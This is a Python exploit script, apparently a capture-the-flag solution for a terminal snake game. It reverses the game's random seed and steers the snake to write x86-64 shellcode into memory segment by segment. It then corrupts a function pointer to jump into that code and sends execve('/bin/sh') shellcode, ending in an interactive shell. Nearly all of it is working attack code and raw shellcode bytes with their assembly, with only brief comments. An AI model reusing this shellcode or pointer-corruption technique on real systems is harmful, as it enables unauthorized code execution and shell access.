import interact
import struct
import re

# Pack integer 'n' into a 8-Byte representation
def p64(n):
    return struct.pack('Q', n)
def p32(n):
    return struct.pack('I', n&0xffffffff)
def p16(n):
    return struct.pack('H', n&0xffff)

# Unpack 8-Byte-long string 's' into a Python integer
def u64(s):
    return struct.unpack('Q', s)[0]

randmul = 1103515245
randadd = 12345
invmul = pow(randmul, -1, 1<<32)

def unrand(x, n=1):
    for i in range(n):
        x = ((x-randadd)*invmul)%(1<<32)
    return x
def nrand(seed):
    return (randmul*seed+randadd)%(1<<32)

def visualize(buf, padb=0):
    out = "|"
    c = padb*8%15
    out += "-"*c
    out += "\x1b[30m"
    colors = ["\x1b[41m", "\x1b[42m", "\x1b[43m", "\x1b[44m", "\x1b[45m", "\x1b[46m"]
    for bit in range(len(buf)*8):
        if bit%8 == 0:
            out += colors[bit//8%len(colors)]
        b = (buf[bit>>3]>>(bit&7))&1
        if b:
            out += "X"
        else:
            out += " "
        if (padb*8+bit)%15 == 14:
            out += "|\n|"
    out += "\x1b[m|"
    print(out)
    print(re.sub("\x1b\[\d*m", "", out))

seed = unrand(0x80000000, 1)
print(hex(seed))
visualize(p32(seed))

scaddr = 0x401be7
snakeaddr = 0x401a77
target = 0x400150

sc = b"\xBF\xb0\xFE\xBF\xFF\xF7\xD7\xFF\xC7\x89\xF8\xFF\xE7"
'''
mov edi, ~(0x400150-1)
not edi
mov eax, edi
inc edi
jmp rdi
'''
sc = b"\xBF\xB0\xFE\xBF\xFF\xF7\xD7\x89\xF8\xFF\xC7\xFF\xE7"
print(hex(u64(sc[:8])))
print(hex(u64(sc[8:]+b"\0\0\0")))

visualize(sc, scaddr-snakeaddr)

p = interact.Process()

# set seed such that first apple will be bad
# start from main menu with chaos selected, ends back at main menu
badapple = "/\nddddddddddwaaaaaaaaaaaaaawddddddddddddddwaaaaaaaaaaaaaawdddddddddddwwdsddwawwaaasawaassaasaawaawasss\n"

p.send("s"+badapple)

# start new normal game
p.send("w/\n")
# this will spawn the bad apple and make head_r 15
# immediatetly move down to avoid "wrapping" to row 0
p.send("s")
# now at 16,4
# shellcode starts at row 196, col 4

# write first segment of shellcode (segments drawn in paint)
# move to col 11, row 195
# move down some first so we dont "collide" with the history bytes
p.send("s"*50+"d"*7+"s"*(195-16-50))
# write shellcode segment
p.send("ssdsassdddwawwdsddsassdddwwdddwa")
# quit
p.send("q\n")

# now repeat for 2nd shellcode segment
p.send("s"+badapple)
p.send("w/\ns") # start normal, move down to 16,4
p.send("s"*50+"d"*3+"s"*(195-16-50)) # move to 195, 7
p.send("sdssawawaas")
p.send("q\n")

# third segment
p.send("s"+badapple)
p.send("w/\ns") # start normal, move down to 16,4
p.send("s"*50+"a"*3+"s"*(195-16-50)) # move to 195, 1
p.send("ssdsd")
p.send("q\n")

# final segment
p.send("s"+badapple)
p.send("/\ns") # start chaos, move down to 16,4
p.send("s"*50+"d"*5+"s"*(195-16-50)) # move to 195, 9
p.send("ssdsasaassaaasddddwdddsdsaawasaaaaaawaaasdd")

# corrupt func ptr to initiate shellcode
# now at 203,2
# move to 227,7 to or function pointer with 0x1000
p.send("s"+"d"*5+"s"*(227-203-1))

# func ptr corrupted, send a move to trigger call
p.send("a")

# now we end up in getchar reading 227 bytes into getchar 0x40014f, return addr from read is 0x40015d
'''
xor eax, eax
mov al, 0x3b
mov rbx, 0x68732f6e69622f
push rbx
mov rdi, rsp
xor esi, esi
xor edx, edx
syscall
'''
sc = b"\x31\xC0\xB0\x3B\x48\xBB\x2F\x62\x69\x6E\x2F\x73\x68\x00\x53\x48\x89\xE7\x31\xF6\x31\xD2\x0F\x05"
sc = b"A"*(0x40015d-0x40014f)+sc
p.send(sc)

p.interactive()
